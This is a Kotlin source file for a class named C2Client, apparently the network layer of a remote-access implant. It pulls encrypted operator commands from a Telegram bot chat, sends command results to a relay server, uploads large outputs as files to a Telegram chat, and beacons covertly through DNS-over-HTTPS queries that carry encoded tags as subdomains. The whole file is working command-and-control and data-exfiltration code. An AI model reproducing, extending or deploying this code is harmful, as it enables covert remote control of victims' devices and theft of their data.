package ai.obsidian.agent.net

import ai.obsidian.agent.AgentApp
import ai.obsidian.agent.crypto.Envelope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class C2Client(
    private val app: AgentApp,
    private val ctx: Envelope.Ctx
) {

    private val http = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS)
        .readTimeout(90, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    private val jsonMedia = "application/json".toMediaType()

    private var offset = 0L

    @Volatile
    var backoffMillis: Long = 2_000L
        private set

    fun resetBackoff() {
        backoffMillis = 2_000L
    }

    fun growBackoff() {
        backoffMillis = (backoffMillis * 2).coerceAtMost(120_000L)
    }

    suspend fun poll(): List<String> = withContext(Dispatchers.IO) {
        val url = buildString {
            append("https://api.telegram.org/bot")
            append(app.cfg.apiKey)
            append("/getUpdates?timeout=50&allowed_updates=%5B%22message%22%5D")
            if (offset > 0L) append("&offset=$offset")
        }

        val request = Request.Builder().url(url).build()
        http.newCall(request).execute().use { response ->
            check(response.isSuccessful) { "telegram http ${response.code}" }
            val body = JSONObject(response.body?.string().orEmpty())
            check(body.optBoolean("ok")) { "telegram not ok" }

            val results = body.optJSONArray("result") ?: return@use emptyList()
            val commands = ArrayList<String>()

            for (index in 0 until results.length()) {
                val update = results.getJSONObject(index)
                offset = update.getLong("update_id") + 1L

                val message = update.optJSONObject("message") ?: continue
                if (message.optJSONObject("from")?.optBoolean("is_bot") == true) continue

                val text = message.optString("text")
                if (!text.startsWith(PREFIX)) continue

                val payload = text.removePrefix(PREFIX)
                if (!Dedupe.firstSighting("$offset:$payload")) continue

                runCatching { String(Envelope.open(app, ctx, payload)) }
                    .onSuccess { commands.add(it) }
                    .onFailure { app.audit.warn("open", it.message.orEmpty()) }
            }

            resetBackoff()
            commands
        }
    }

    suspend fun send(kind: String, payload: String) = withContext(Dispatchers.IO) {
        val bytes = payload.toByteArray()
        if (bytes.size > DOCUMENT_THRESHOLD) {
            sendAsDocument(kind, bytes)
            return@withContext
        }
        for (chunk in bytes.asList().chunked(MESSAGE_CHUNK)) {
            postResult(Envelope.seal(app, ctx, kind, chunk.toByteArray()))
        }
    }

    private fun postResult(envelope: String) {
        val request = Request.Builder()
            .url("${app.cfg.relayBase}/agent/${app.cfg.deviceId}/result")
            .header("Authorization", "Bearer ${app.cfg.bearer}")
            .post(envelope.toRequestBody(jsonMedia))
            .build()
        http.newCall(request).execute().use { response ->
            check(response.isSuccessful) { "relay http ${response.code}" }
        }
    }

    private fun sendAsDocument(kind: String, bytes: ByteArray) {
        val envelope = Envelope.seal(app, ctx, "manifest", bytes)
        val part = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", app.cfg.chat)
            .addFormDataPart(
                "document",
                "${kind}_${System.currentTimeMillis()}.env",
                envelope.toByteArray().toRequestBody("application/octet-stream".toMediaType())
            )
            .build()
        val request = Request.Builder()
            .url("https://api.telegram.org/bot${app.cfg.apiKey}/sendDocument")
            .post(part)
            .build()
        http.newCall(request).execute().use { response ->
            check(response.isSuccessful) { "document http ${response.code}" }
        }
    }

    suspend fun beacon() = withContext(Dispatchers.IO) {
        val tag = Envelope.seal(app, ctx, "msg", "beacon".toByteArray())
            .take(48)
            .replace('+', '-')
            .replace('/', '_')
        runCatching {
            val request = Request.Builder()
                .url("https://cloudflare-dns.com/dns-query?name=$tag.obs.${app.cfg.relayHost}&type=TXT")
                .header("accept", "application/dns-json")
                .build()
            http.newCall(request).execute().close()
        }
    }

    companion object {
        private const val PREFIX = "OBS2."
        private const val MESSAGE_CHUNK = 1800
        private const val DOCUMENT_THRESHOLD = 9000
    }
}
